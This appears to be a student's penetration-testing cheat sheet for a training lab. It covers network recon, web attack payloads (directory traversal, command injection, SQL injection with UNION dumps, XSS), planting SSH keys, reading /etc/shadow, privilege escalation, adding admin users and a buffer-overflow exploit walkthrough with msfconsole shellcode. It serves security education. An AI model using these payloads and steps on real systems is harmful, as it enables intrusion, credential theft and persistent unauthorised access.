I. Recon and Footprinting:Network and Host Enumeration:If you find an IP:     1. Identify Live Hosts (skip this step if it’s a 10.50… IP):	• run a ping sweep/ping for-loop from target space to identify live hosts. This MUST BE DONE from target space/previous hop. Your ops box can only see the public internet (and 10.50… IP addresses)	• windows: for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.    	• linux (must be in bash): for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done    2. Identify Open Ports on Live Hosts:    	• Do a simple port scan (nmap -sT or NC) from your ops box against Ips you found in your ping sweep and note open ports    	• EX: proxychains nmap -Pn -sT 1.2.3.4 -p 1-1000    3. Identify Services on Open Ports:    	• Run an NC banner grab or nmap version scan (-sV) against open ports found in the previous step and note what service and version is running each discovered port    	• EX: proxychains nmap -Pn -sV 1.2.3.4 -p 21-23,80,443    4. Enumerate Services using nmap scripts        ◦http-enum.nse, smb-os-discover.nse etc can get you good info        ◦EX: proxychains nmap -Pn -sT 1.2.3.4 -p 80 --script http-enum.nseII. Web Exploitation:FTP:    	• Wget and curl to pull files	• It is possible to use credentials with wget and curl. If you have credentials, you may be able to download additional files that an anonymous FTP wget won’t grab	• You may run an nmap ftp enum script as well if you preferSSH and RDP:	• If we have creds or keys, try them.	• If we don't have creds, keep these ports in mind. Maybe we'll find creds or keys later. Maybe we won't.SMB:    	• run an smb OS enum script from ops box to get information on hostnames, domain names, and network shares.HTTP:dig/dns query - probably not necessary in our contained environments    	• If there is an internal DNS server, you may need to run your dig/whois from target spacerobots.txt    	• Open all pages and directories indicatedhttp-enum script     	• open all discovered pages and directories from ops box    	• View the page as presented    	• View the page source for links or php that might not be immediately obvious (ctrl+f for href)    	• If the page has input boxes, or you see a [?thing=] in your url:		- Attempt directory traversal (../../../../../../../etc/passwd)		- Attempt command injection (; cat /etc/passwd)		- Attempt SQL injection (tom' or 1='1 || tom OR 1=1)    	• If SQL Injection works:		- attempt a login if it's a login page 			• tom' or 1='1 in username AND password field			• try both POST and GET method (login.php?[username_variable]=tom' OR 1='1 & [password_variable]=tom' OR 1='1;#)		- Attempt to dump unintended results with the or 1=1 method		- Identify vulnerable entries and attempt to dump the contents of the entire database using your Golden Statement			1) Identify vulnerable field or option (value=X OR 1=1)			2) Identify number of columns required for Union Select (value=X UNION SELECT 1,2,3)			3) Use Golden Statement to identify user created data (value=X UNION SELECT table_schema,table_name,column_name[,4,5...] FROM information_schema.columns)			4) Profit (value=X UNION SELECT column1,column2,column3... FROM database.table)	• If it has a message/chat box or forum:		- Consider stored XSS or reflected XSS	• If there are dropdowns:		- check for PHP, and attempt GET and POST as above (directory traversal, etc)		- Check developer console for java code we can control		- Identify vulnerable entries and attempt SQL Injection to dump the contents of the entire database using your Golden Statement (as above)	• If there is an ability to upload AND a way to access what we've uploaded:		- Upload the command injection php from the WebEx FG, then see below	• If we can get command injection:		- Look for credentials and ssh keys		- upload ssh keys if needed		- use those creds or keys to get on the boxSSH KEY access via malicious upload or command injection:	• Once we find a place where we can run commands on target, run 'whoami' to tell us what user is running the webpage	• cat /etc/passwd to see where their home directory is and if they get a login shell	• check to see if they have a .ssh directory in their home directory. If they don't have one, make one	• cat out your ssh public key on your ops box	• on the target, echo "[your whole public key]" >> /path/to/users/home/.ssh/authorized_keys	• ssh into the target. If using a private key NOT in your .ssh folder AND named id_rsa, you will need to use -i /path/to/private/keyPost-Exploitation:NIX: Enumerate other users:	- cat /etc/passwd and note users, their home directories, and their login shells	- cat /etc/group and note user groups (sudo or wheel are standard privileged groups, but check others as well)	- view /home/ directory and check user directories if able	- w or who to see who is currently onlineEnumerate processes and services of interest:	- ps -elfH	- systemctl list-units --type service OR service --status-all	- check configs (usually in /etc/)Enumerate Network Info:	- identify ip & network info with ip a	- identify current connections and listening services with ss -nltp	- check /etc/hosts for possible hosts or networks		Identified hosts and networks should be subjected to the recon steps above)Enumerate scheduled processes:	- check /etc/crontab	- check /etc/cron.d/*	- check /var/spool/cron* and /var/spool/atEnumerate other files and directories of interest:	- Any ssh keys or password files?	- Anything interesting in /etc/?	- uname -a or cat /etc/*rel*	- Check /tmp and /var/tmp	- syslog or rsyslog configs to see what will log	- Check /var/log/	- find / -type [f for file or d for directory] -iname "what you're looking for"	- Check /root (once priv esc'd)	- check /etc/shadow (once priv esc'd)Attempt Priv Esc:	- identify current privs with sudo -l		GTFOBins anything that came up and look for sudo vulnerabilities	- Identify SUID/SGID bit binaries		GTFOBins anything not on your linops and look for SUID vulnerabilities	- Does anything execute from files or directories we can write to? Perhaps we can replace it with a malicious script of the same name	- Are there any root-level cronjobs or writeable cron directories we can write to?	- Are there other users we can move laterally into who may have more permissions than us?WINDOWSEnumerate other users:	- net user	- net localgroup	- query user	- view C:\Users\ directory and check user directories if ableEnumerate processes and services of interest:	- tasklist /v OR task manager	- net start OR services managerEnumerate Network Info:	- identify ip/network info with ipconfig /all	- identify current connections and listening services with netstat /anobEnumerate scheduled processes:	- Check schtasks or the Task Scheduler for user created scheduled tasksEnumerate other files and directories of interest:	**MAKE SURE WHEN CHECKING FILES ON WINDOWS THAT YOU ARE VIEWING HIDDEN FILES**	- C:\users\	- C:\Windows\temp	- use registry editor to check  [HKLM || HKCU]\Software\Microsoft\Windows\CurrentVersion\[Run || RunOnce]	- auditpol to see what will log (this will require priv esc)	- wevtutil or windows event viewer to view logs (this will require priv esc)Attempt Priv Esc:	- net user [your username] to see what groups you're in	- net localgroup to see what the admin group is and who is in it	- Look for user created scheduled tasks and services (no description)	- Can we replace any running services or scheduled jobs with malicious binaries?	- Is anything missing dll's we can replace with malicious versions?	- Is there an unquoted path with a space in it? (something calling C:\Program Files\ instead of “C:\Program Files”	- Are there other users we can move laterally into who may have more permissions than us?	- do we see secure server/9999? If so, we can use our remote buffer overflow script (just change the ip and port) to create a system shell listening port on 4444	- you can create a user with net user [username] [password] /add AND net localgroup Administrators [user] /add		Reverse Engineer Strange Binaries:	1) Copy back to your box	2) Strings/file and other static analysis and note ASCII text and operating system	3) Run it normally to try to figure out what it does. 		Play around with it. 		Note any strings or behavior		See if it created any files or updated anything (find / -type f -type d -mmin 5)	4) Open it up in Ghidra and find desired function using Search for strings, 		search back through functions until you find out how to get desired output		Rename functions and variables to help remember what each thing is	5) Patch if you gottaExploit Development:	1) follow the FG Buffer Overflow Process. It's much too complex to summarize here without leaving something important out	https://pages.ccoecaas.net/us-army-cyber-school/completesite/cctc/sec/security/07_Exploit_Developement.html#buffer-overflow-processBut if you must1) Crash the binary by feeding it LOTS of A’s. Look for that segmentation fault.	Note whether it takes input as a runtime argument or after a prompt2) Open it in gdb (gdb [binaryname])	You can attempt to identify the vulnerable function by running disass main or disass [functionname]. Anything that says “call” is a function3) Copy a big pattern from the wiremask pattern generator and crash it in gdb4) Note the value in the EIP, and put it into wiremask to identify the offset5) In a python script 	offset = ‘A’ * [offset value]	eip = ‘BBBB’	nop = ‘C’ * 10	print(offset+eip+nop)6) Crash the program in gdb again using your python script to verify your offset (eip should show 424242427) Find your EIP value on target by exiting and then running env - gdb [binary name]8) unset env LINES and unset env COLUMNS9) Run and crash it, and run info proc map10) Note the first memory address after the heap and the last before the stack.11) Run some jmp esp assembly instructions: find /b [first after heap],[last before stack],0xff,0xe412) Grab a few memory addresses for reference and put one of them in your eip variable in your script. It’ll probably be little endian so do bytes backwards (\x12345678 becomes \x78\x56\x34\x12)13) Pick your payload in msfconsole (probably linux/x86/exec)14) Show your options then set them15) generate -b “\x00\x0a\x03\x0d\x20” -f python 16) Copy and paste that shellcode into your script. 17) Change nop value to ‘\x90’ * 1018) Change the print statement to print(offset+eip+nop+buf)19) Now run that program with your script and profit!	If it takes input at runtime: [binary] $(python bufferscript.sh)	If it prompts for input: [binary] <<< $(python bufferscript.sh)	Sudo if you need to	Your opsbox has john the ripper, a password cracker. If you can access /etc/shadow or other password hashes and get your hands on a wordlist, see if you can crack creds	john --wordlist=/path/to/wordlist /file/with/hashes